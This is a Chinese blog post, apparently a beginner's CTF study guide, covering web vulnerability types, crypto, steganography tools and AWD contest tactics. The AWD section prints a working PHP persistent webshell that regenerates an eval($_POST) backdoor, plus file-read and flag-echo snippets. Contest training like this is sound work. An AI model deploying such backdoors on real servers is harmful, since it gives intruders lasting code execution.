@@ -1,0 +1,1052 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>86CTF | JohnScott2046的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott2046</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>86CTF</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2022-08-28
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="86CTF"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><h3 id="一、-什么是CTF"><a href="#一、-什么是CTF" class="headerlink" title="一、 什么是CTF"></a>一、 什么是CTF</h3><p>Capture The Flag(简称CTF)，直译为”夺旗赛”，起源于1996年举办的DEF CON全球黑客大会,最早是交流安全技术的重要途径。随着时间的推移，CTF竞赛逐渐演变成为信息安全技术竞赛的一种形式，发展成为全球范围网络安全圈的流行比赛，但其比赛形式与内容依然拥有浓厚的黑客精神和黑客文化。近年来，CTF竞赛活动蓬勃发展，国内外各类高质量的CTF竞赛层出不穷，CTF已经成为了学习锻炼信息安全技术，展现安全能力和水平的绝佳平台</p>
+<h3 id="二、-CTF需要准备什么"><a href="#二、-CTF需要准备什么" class="headerlink" title="二、 CTF需要准备什么"></a>二、 CTF需要准备什么</h3><ol>
+<li>环境</li>
+</ol>
+<p>kali、 PHP、 Python等</p>
+<ol start="2">
+<li>工具</li>
+</ol>
+<p>御剑、 sqlmap、 msf、 burpsuite、 IDA、 OD等      </p>
+<h3 id="三、-题目分类"><a href="#三、-题目分类" class="headerlink" title="三、 题目分类"></a>三、 题目分类</h3><table>
+<thead>
+<tr>
+<th>方向</th>
+<th>占比</th>
+<th>题数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>web</td>
+<td>30%</td>
+<td>6</td>
+</tr>
+<tr>
+<td>杂项</td>
+<td>20%</td>
+<td>3</td>
+</tr>
+<tr>
+<td>密码学</td>
+<td>20%</td>
+<td>3</td>
+</tr>
+<tr>
+<td>逆向</td>
+<td>15%</td>
+<td>2</td>
+</tr>
+<tr>
+<td>pwn</td>
+<td>15%</td>
+<td>2</td>
+</tr>
+</tbody></table>
+<h3 id="四、-web题目"><a href="#四、-web题目" class="headerlink" title="四、 web题目"></a>四、 web题目</h3><h4 id="常见的flag位置"><a href="#常见的flag位置" class="headerlink" title="常见的flag位置"></a>常见的flag位置</h4><ol>
+<li>查看HTTP请求头或响应头部信息中(cookie等)</li>
+<li>Html源码中，加注释</li>
+<li>修改或添加HTTP请求头</li>
+<li>302跳转的中转网页有信息</li>
+<li>登录后的页面中</li>
+<li>阅读javascript代码，直接控制台获取正确密码</li>
+<li>javascript代码绕过</li>
+<li>数据库中(SQL注入)</li>
+<li>XSS后弹框中</li>
+<li>上传成功后的信息中</li>
+<li>文件执行、文件包含、源码泄露等</li>
+<li>使用burp的repeater查看整个HTTP包</li>
+<li>robots.txt文件获取信息</li>
+<li>bash_history</li>
+</ol>
+<h4 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h4><p>基础工具: Burpsuite，御剑，python, firefox(hackbar，foxyproxy,user-agent，swither 等)<br>了解Burpsuite的使用方式、firefox(hackbar, foxyproxy, user-agent, swither等)插件的使用给漏洞挖掘带来便利</p>
+<p>扫描工具:nmap，nessus、openvas了解nmap等扫描工具的使用</p>
+<p>SQL注入工具: 注入在CTF WEB中比较常见，通过暴库找到flag；利用xss弹cookie的方式弹出flag</p>
+<p>文件上传工具: 菜刀、蚁剑等</p>
+<p>暴力破解工具: burp暴力破解模块，md5Crack，hydra</p>
+<h4 id="文件包含漏洞原理"><a href="#文件包含漏洞原理" class="headerlink" title="文件包含漏洞原理"></a>文件包含漏洞原理</h4><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般称为包含。</p>
+<p>文件包含漏洞<br>开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量,用来进行动态调用，而文件包含漏洞产生的原因正是函数通过变量引入文件时，没有对传入的文件名进行合理的校验，从而操作了预想之外的文件，这样就导致以外的文件泄漏甚至恶意的代码注入，例如 <code>include $_GET[&#39;page&#39;];</code></p>
+<p>常见的文件包含函数<br>php: include(), include_once(), require(), require_once(), fopen(), readfile()<br>Jsp/servlet: java.io.File(), java.io.FileReader()<br>asp: include file, include virtual </p>
+<p>利用条件：</p>
+<ol>
+<li>使用了文件包含函数</li>
+<li>用户可以动态控制变量</li>
+<li>php.ini的allow_url_fopen allow_url_include要为on</li>
+</ol>
+<p>本地文件包含<br>读敏感文件、配置文件<br>日志文件 getshell<br>data: php://input等伪协议<br>phpinfo 则可以包含临时文件<br>配合上传图片马、然后包含执行getshell</p>
+<p>远程文件包含<br>远程木马 getshell (需要allow_url_fopen可以访问url对象文件 allow_url_include是否允许包含文件对象要为on)</p>
+<p>长路径限制、点点点绕过<br>条件：Windows 点号大于256  Linux大于4096<br>超过该长度 内容会被丢弃</p>
+<p>封装协议</p>
+<p>file://  http://  ftp://  php://  data://<br>文件系统                   输入、输出流  数据</p>
+<h4 id="执行任意命令漏洞"><a href="#执行任意命令漏洞" class="headerlink" title="执行任意命令漏洞"></a>执行任意命令漏洞</h4><p>应用程序直接/间接使用了动态执行命令的危险函数，并且这个函数的运行参数是用户可控的</p>
+<p>php可动态执行的有eval、system、exec、passthru;<br>jsp可动态执行的有: Runtime.getRuntime().exe(..)<br>asp/aspx可动态执行的有: eval等等</p>
+<p>命令执行/代码注入漏洞的本质<br>程序设计违背了”数据与代码分离的原则”</p>
+<h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p>上传接口对于文件的类型(通常是对后缀名)检验存在疏漏导致的安全问题，一般表现为在上传接口可使用某些方法绕过安全检验。上传可动态解析的脚本文件，以此达到任意代码执行。一般来说，可动态解析的脚本文件是通过后缀名决定的，具体后缀名与服务器web应用的配置有关</p>
+<p>文件上传漏洞危害<br>上传漏洞一般为上传可解析的动态脚本文件，所以一旦发生，则会导致严重的问题，一般为服务器权限被获取(用户权限与web应用权限相同)。如果配置不当,则可能导致服务器最高权限被获取，通常会出现在Windows的非IIS服务上、 Linux的java应用 上等等。即使没有获取到最高权限，攻击者也可以继续上传提权程序，利用多种方式将应用权限提升到最高权限，以此获取服务器的完整控制权</p>
+<p>上传流程</p>
+<ol>
+<li>客户端javascript检测(通常为检测文件扩展名)</li>
+<li>服务端MIME类型检测(检测Content-Type内容)</li>
+<li>服务端目录路径检测(检测跟path参数相关的内容)</li>
+<li>服务端文件扩展名检测(检测跟文件extension相关的内容)</li>
+<li>服务端文件内容检测(检测内容是否合法或含有恶意代码)</li>
+</ol>
+<p>上传绕过的几种方式</p>
+<ol>
+<li>javascript验证突破</li>
+<li>大小写突破</li>
+<li>服务器文件扩展名检测</li>
+<li>过滤文件名突破</li>
+<li>特殊后缀名</li>
+<li>MIME类型检测</li>
+<li>文件内容检测</li>
+<li>分布式配置文件(文件重写)</li>
+<li>0x00截断(目录路径检测)</li>
+</ol>
+<h3 id="五、-密码学"><a href="#五、-密码学" class="headerlink" title="五、 密码学"></a>五、 密码学</h3><p>关注密码算法，以及识别加密手段。要求熟悉各类加密以及密文特征，例如base64加密后可能有=<br>填充，html加密后有&amp;符号等</p>
+<p>密码学难度中等，关键是能够识别密码算法，一般解题需要工具辅助或自己编写解题脚本。</p>
+<p>辅助工具: <a target="_blank" rel="noopener" href="http://www.wishingstarmoye.com、/">www.wishingstarmoye.com、</a> <a target="_blank" rel="noopener" href="http://www.hiencode.com/">www.hiencode.com</a></p>
+<h4 id="常见的加密特征"><a href="#常见的加密特征" class="headerlink" title="常见的加密特征"></a>常见的加密特征</h4><ol>
+<li>ASCII编码</li>
+</ol>
+<p>用字符所对应的ASCII编码的十进制表示字符</p>
+<ol start="2">
+<li>url加密</li>
+</ol>
+<p>URL编码后的格式是%xx，是该字符对应的ascii码的十六进制表示的前面加% </p>
+<ol start="3">
+<li>莫斯密码</li>
+</ol>
+<p>摩尔斯电码主要是由. - 组成，每一个字符之间通常用空格来表示</p>
+<ol start="4">
+<li>base64加密</li>
+</ol>
+<p>base64的编码表是由（A-Z、a-z、0-9、+、/）64个可见字符构成，”=”号用作后缀填充</p>
+<h4 id="密码学解题"><a href="#密码学解题" class="headerlink" title="密码学解题"></a>密码学解题</h4><p>题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及些常见编码解码，主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合</p>
+<ol>
+<li>密码学对现代密码算法如RSA、AES、DES出题很少，更喜欢古典的加密方式以及新奇的加密方式</li>
+<li>善用搜索引擎，对于CTF初学者来说，很难对各种加密算法有所了解，那么互联网是很好的选择</li>
+<li>一个密码学题目可能不仅用到一种加密!</li>
+</ol>
+<p>密码学阶段</p>
+<ol>
+<li>第一个阶段是从古代到19世纪末——古典密码(classical cryptography)</li>
+<li>第二个阶段从20世纪初到1949年——近代密码</li>
+<li>第三个阶段从C.E.Shannon(香农)于1949年发表的划时代论文”The Communication Theory ofSecret Systems”开始——现代密码</li>
+<li>第四个阶段从1976年W. Diffie和M.Hellman创造性地发表了论文”New Directions inCryptography”开始——公钥密码</li>
+</ol>
+<p>密码编码学</p>
+<ol>
+<li>密码编码学是密码学的一个分支，研究与信息安全（例如:机密性、完整性、可鉴别性)有关的数学技术</li>
+<li>密码编码学是包含数据变换的原理、工具和方法的一门学科，这种数据变换的目的是为了隐藏数据的信息内容，阻止对数据的篡改以及防止未经认可使用数据</li>
+<li>密码编码学是论述使明文变得不可懂的密文，以及把已加密的消息变换成可懂形式的艺术和技巧</li>
+</ol>
+<p>对称密码算法(Symmetric cipher)又称为传统密码算法(Conventional cipher)、秘密密钥算法、单密钥算法，也就是加密密钥和解密密钥相同，或实质上等同，即从一个易于推出另一个。例如 DES、3DES、IDEA、AES</p>
+<p>非对称密码算法(Asymmetric cipher)又称为公钥密码算法(Public-key cipher)，其中加密密钥可以公开，称为公开密钥(public key)，简称公钥;解密密钥必须保密，称为私人密钥(private key)，简称私钥。例如 RSA、ECC、ElGamal</p>
+<p>古典密码：凯撒加密<br>凯撒加密(Caesar cipher)是一种最简单且最广为人知的加密技术，它属于替代加密，明文中的所有字母都在字母表上向后(或向前)按照个固定数目进行偏移后被替换成密文</p>
+<p>凯撒加密会生成一个一一对应的密码表 ，加密和解密过程都是通过查表完成的。和很多其他的单表替换加密样，凯撒加密是十分不安全的。可以把移位值看作密钥key,不难想到，在明文空间为26个英文字母时，有效的密钥只有25个。所以很容易枚举出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGH</span><br><span class="line">XYZABCDE</span><br></pre></td></tr></table></figure>
+
+<p>摘要算法<br>数据摘要算法是密码学算法中非常重要的一个分支，它通过对所有数据提取指纹信息以实现数据签名、数据完整性校验等功能，由于其不可逆性，有时候会被用做敏感信息的加密。</p>
+<p>数据摘要算法也被称为哈希(Hash）算法、散列算法，常见的摘要算法有MD5和SHA。在互联网上进行文件传输时，发送文件前利用工具先进行文件md5或md5sum，这样接收者接收到文件后，就可以利用相对应的方式来校验数据完整性，而且部分操作系统也使用此算法来对用户密码进行加密，另外它也是目前计算机犯罪中数据取证的最常用算法。</p>
+<p>SHA中SHA1的应用较为广泛，主要应用于CA和数字证书中，另外在互联网中流行的BT软件中，也是使用SHA1来进行文件校验的，由于SHA系列算法的数据摘要长度较长，因此其运算速度与MD5相比，也相对较慢</p>
+<h3 id="六、-隐写-杂项"><a href="#六、-隐写-杂项" class="headerlink" title="六、 隐写(杂项)"></a>六、 隐写(杂项)</h3><p>最简单的隐写：直接将flag隐藏在文件或图片的内容中</p>
+<ol>
+<li><p>常见隐写题型为图片，但绝不仅限于图片隐写。隐写术存在于各种各样的文件类型中，例如文本、<br>压缩包、音频、视频等</p>
+</li>
+<li><p>隐写术不但类型繁多，藏匿位置也很丰富，但是题目一般有迹可循，套路题目则直接上工具。</p>
+</li>
+</ol>
+<p>图片隐写术</p>
+<ol>
+<li><p>细微的颜色差别</p>
+</li>
+<li><p>GIF图多帧隐藏<br> 颜色通道隐藏<br> 不同帧图信息隐藏<br> 不同帧对比隐写</p>
+</li>
+<li><p>Exif信息隐藏（定位）<br> Exif按照JPEG的规格在JPEG中插入一些图像、数字相机的信息数据以及缩略图像。可以通过与IPEG<br>兼容的互联网浏览器/图片浏览器/图像处理等一些软件来查看Exif格式的图像文件。就跟浏览通常的JPEG<br>图像文件一样。图片右键属性，查看exif或查看详细信息，在相关选项卡中查找flag信息</p>
+</li>
+<li><p>图片修复<br> 图片头修复<br> 图片尾修复<br> CRC校验修复<br> 长、宽、高度修复</p>
+</li>
+<li><p>最低有效位LSB隐写<br> 基本思想是用嵌入的秘密信息取代载体图像的最低比特位，原来的的7个高位平面与替代秘密信息的最低位平面组合成含隐藏信息的新图形。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 像素三原色（RGB) 红 绿 蓝</span><br><span class="line">2. 通过修改像素中最低位的1bit来达到隐藏的效果</span><br><span class="line">3. 工具: stegsolve、zsteg、wbstego4、python脚本</span><br><span class="line"></span><br><span class="line">zsteg 工具</span><br><span class="line">gem install zsteg</span><br><span class="line">检测LSB隐写 zstag -a 文件名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>图片加密<br> Stegdetect<br> outguess<br> Jphide<br> F5</p>
+</li>
+</ol>
+<h4 id="如何解题"><a href="#如何解题" class="headerlink" title="如何解题"></a>如何解题</h4><ol>
+<li><p>无论任何隐写，首先从”表面”入手，不借助任何工具也是可以解题的，属性、二进制中也会有答案</p>
+</li>
+<li><p>Kali永远是个好帮手，熟练应用binwalk和foremost两条命令</p>
+</li>
+<li><p>图片不一定用看，音乐不一定用听。隐写总会藏在想不到的地方</p>
+</li>
+<li><p>当两张图片外观、大小、像素基本相同时，可使用stegsolve进行结合分析，即将两个文件的像素RGB值进行XOR、ADD、SUB等操作，看能否得到有用信息</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开第一张图片，点击analyse-&gt;image combiner</span><br><span class="line">在弹出的窗口点击左右按钮 选择处理方式，点击save保存有价值的结果</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ol>
+<li>使用 <code>file 文件名</code> 查看文件信息</li>
+</ol>
+<p>使用场景:当文件没有后缀或者有后缀而无法正常打开时，根据识别出的文件类型来修改后缀即可正常打开文件</p>
+<ol start="2">
+<li>使用 <code>c32asm.exe</code> 程序可以查看文件头类型，根据文件头类型判断出文件类型</li>
+</ol>
+<p>使用场景: windows下通过文件头信息判断文件类型   </p>
+<table>
+<thead>
+<tr>
+<th>常见文件类型</th>
+<th>文件头</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jpeg(jpg)</td>
+<td>FFD*FFE1</td>
+</tr>
+<tr>
+<td>png</td>
+<td>89504E47</td>
+</tr>
+<tr>
+<td>gif</td>
+<td>47494638</td>
+</tr>
+<tr>
+<td>tiff(tif)</td>
+<td>49492A00</td>
+</tr>
+<tr>
+<td>windows bitmap(bmp)</td>
+<td>424DC001</td>
+</tr>
+<tr>
+<td>zip</td>
+<td>504B0304</td>
+</tr>
+<tr>
+<td>rar</td>
+<td>52617221</td>
+</tr>
+<tr>
+<td>psd</td>
+<td>38425053</td>
+</tr>
+<tr>
+<td>rtf</td>
+<td>7B5C727466</td>
+</tr>
+<tr>
+<td>xml</td>
+<td>3C3F786D6C</td>
+</tr>
+<tr>
+<td>pdf</td>
+<td>255044462D312E</td>
+</tr>
+<tr>
+<td>wave(wav)</td>
+<td>57415645</td>
+</tr>
+<tr>
+<td>pcap</td>
+<td>4D3C2B1A</td>
+</tr>
+</tbody></table>
+<ol start="3">
+<li>文件头残缺/错误</li>
+</ol>
+<p>通常文件无法正常打开有两种情况，一种是文件头部残缺，另一种是文件头部字段错误。 </p>
+<p>针对文件头部残缺的情况，使用c32asm.exe程序添加相应的文件头，<br>针对头部字段错误，可以找一个相同类型的文件进行替换。</p>
+<p>使用场景: 文件头部残缺或文件头部字段错误无法打开正常文件。<br>格式:  <code>file 文件名</code></p>
+<h4 id="Binwalk工具"><a href="#Binwalk工具" class="headerlink" title="Binwalk工具"></a>Binwalk工具</h4><p>Binwalk是Linux下用来分析和分离文件的工具，可以分辨文件是否由多个文件合并而成，并将文件进行分离。</p>
+<p>如果分离成功会在目标文件的同目录下生成一个文件名<code>extracted</code>的目录，目录中有分离后的文件。 </p>
+<p>用法<br>分析文件: binwalk filename<br>分离文件: binwalk -e filename</p>
+<h4 id="foremoat"><a href="#foremoat" class="headerlink" title="foremoat"></a>foremoat</h4><p>如果<code>binwalk</code>无法正确分离出文件，可以使用<code>foremost</code>将目标文件复制到<code>kcali</code>中，成功执行后会在目标文件的目录下生成我们设置的目录，目录中会按文件类型分离出文件。</p>
+<p>用法<br>foremoat filename -o 文件夹名<br>foremost 分离文件时不会解压文件</p>
+<h4 id="DD手动分离文件"><a href="#DD手动分离文件" class="headerlink" title="DD手动分离文件"></a>DD手动分离文件</h4><p>当文件自动分离出错或者因为其他原因无法自动分离时，可以使用dd实现文件手动分离。</p>
+<p>格式<br>dd if=源文件 of=目标文件名 bs=1 skip=开始分离的字节数</p>
+<p>参数说明<br>if=file    输入文件名，缺省为标准输入<br>of=file    输出文件名，缺省为标准输出<br>bs=bytes    同时设置读写块的大小为bytes ,可代替ibs和obs<br>skip=blocks    从输入文件开头跳过blocks个块后再开始复制</p>
+<h4 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h4><p>给出一个md5值要求你合并文件后的md5值与所给出的相同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat 1 2 3 &gt; 1.txt</span><br><span class="line">md5sum 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>在windows中使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile filename md5</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="七、-杂项解题"><a href="#七、-杂项解题" class="headerlink" title="七、 杂项解题"></a>七、 杂项解题</h3><p>杂项真的很杂，从社工到数据分析无所不有，可能答案就是某个明星的喜好，或者是关注个微博，或者是对某个入侵日志分析。</p>
+<p>杂项对选手的综合能力要求较高，各类型的信息收集能力，分析能力等</p>
+<p>杂项可以是最简单的也可以是最猥琐的。因为杂项题目设计知识点很多可能与其他5类题目也会擦边，一般只能根据提示找到入口。所以关键就看懂题目的提示，并跟随提示走下去(有可能也会有陷阱)</p>
+<h3 id="八、-逆向工程"><a href="#八、-逆向工程" class="headerlink" title="八、 逆向工程"></a>八、 逆向工程</h3><p>逆向题目是指对各种各样完成编译的可执行程序进行逆向工程，对源码进行分析后找到正确的flag，逆向后可能需要分析算法或者找到被屏蔽的flag，通过对源码的仔细分析一定可以解出逆向题目</p>
+<h3 id="九、-CTF线下赛"><a href="#九、-CTF线下赛" class="headerlink" title="九、 CTF线下赛"></a>九、 CTF线下赛</h3><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><h5 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h5><ol>
+<li><p>探测主机。用 Nmap 或者 HTTPScan等工具，先扫描主办方给的内网存活主机，弄明白网络拓扑</p>
+</li>
+<li><p>探测端口。因为主办方给的机器都是一样的，可以直接看本机开了哪些端口。如果不一样的话，使用 Nmap 进行常见端口扫描，再后台进行全端口的扫描，发现新端口加入到攻击队列中</p>
+</li>
+<li><p>探测端口服务。端口服务一般用 Nmap 就能扫到，并且可以用 Nmap 的脚本扫一下漏洞，但是需要注意 Nmap 的相关参数，这要根据情况灵活运用。</p>
+</li>
+</ol>
+<h5 id="Exploit库积累"><a href="#Exploit库积累" class="headerlink" title="Exploit库积累"></a>Exploit库积累</h5><p>往往线下赛都不允许选手连接外网，而AWD的web题目大多是一些成型的CMS或框架漏洞，手动利用繁琐且复杂，<br>因此提前准备大量的exploit，掌握更多的利用姿势，有利于在比赛中抢占先机</p>
+<h5 id="流量混淆"><a href="#流量混淆" class="headerlink" title="流量混淆"></a>流量混淆</h5><p>在比赛时，为了混淆视听，加大对手分析流量的难度，参赛者可以提前准备一些混淆流量脚本，最简单的方法是<br>通过sqlmap或者自动化攻击过程中随机发送payload</p>
+<h5 id="合理的防护工具"><a href="#合理的防护工具" class="headerlink" title="合理的防护工具"></a>合理的防护工具</h5><p>AWD是一场攻守兼备的比赛，在不破坏比赛的情况下，自备一些合理的防护工具可以大幅减轻防守的压力。例如安恒的AoiAWD专为比赛设计，就是一款便携性好，低权限运行的EDR系统</p>
+<h4 id="比赛技巧"><a href="#比赛技巧" class="headerlink" title="比赛技巧"></a>比赛技巧</h4><h5 id="快速反应"><a href="#快速反应" class="headerlink" title="快速反应"></a>快速反应</h5><ol>
+<li><p>如果题目是通用的框架，简单有效的做法是把整站源码下载下来，直接用工具审计。<br>一般的流程是先D盾查杀，发现带有预留后门或者Webshell马上报给防守队友进行加固。</p>
+</li>
+<li><p>把后门问题搞定、防止别人快速拿分后，其次才是源码审计，发现问题点后迅速验证，报给防守队友，并且开始写攻击脚本。<br>一般是使用 Seay 等源码审计工具，审核出比较明显的漏洞。</p>
+</li>
+<li><p>一般情况下，出题会设置一些简单的漏洞</p>
+</li>
+</ol>
+<p>例如任意文件读取 <code>&lt;?php readfile($_GET[&#39;url&#39;]);?&gt;</code></p>
+<p>快速找到行数最短的文件 <code>find ./ -name &#39;*.php&#39; | xargs wc -l | sort -u</code></p>
+<ol start="4">
+<li>AWD比赛中的Web题目中往往需要写入不死马来预防查杀</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$file &#x3D; &#39;link,html.php&#39;;</span><br><span class="line">$shell &#x3D; &quot;&lt;?php eval($_POST[&#39;123456789123456&#39;]);?&gt;&quot;;</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">    if (!file_exists($file)) &#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        unlink(&#39;xxxxxx.php&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    usleep(60);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>删除不死webshell的常见方法的有以下两种</p>
+<p>a. 循环kill相应进程 <code>ps aux |grep www-data |awk &#39;&#123;print $2&#125;&#39; | xargs kill</code><br>b. 条件竞争，创建一个与不死webshell生成的一样名字的文件夹。<br>例如，webshell的名称是1.php，那么使用<code>mkdir 1.php</code>命令即可</p>
+<ol start="5">
+<li>在一些404页面或者比较难以发现的地方（如登录），直接使用 “echo <code>cat/f*</code> “命令，将获取的flag写到HTML标签中访问不存在页面或者登录页面便可以拿到flag</li>
+</ol>
+<p><code>&lt;input type=&quot;hidden&quot; name=&#39;&lt;?php echo </code>cat /flag<code>;?&gt;&#39; value=&quot;sign in&quot; class=&quot;btn btn-primary&quot; &gt; </code></p>
+<ol start="6">
+<li><p>在AWD比赛中，题目权限的维持大部分要依靠webshell。在比赛过程中往往会出现这种情况：A参赛队伍批量化攻击所有参赛者的时候，没有进行shell名称或者密码的随机化，导致其他参赛队伍（如D）的webshell地址、密码都是一致的，这样会导致D可以利用A的webshell来对其他参赛队伍进行攻击，甚至设置自己的webshell，将A的webshell删除。</p>
+</li>
+</ol>
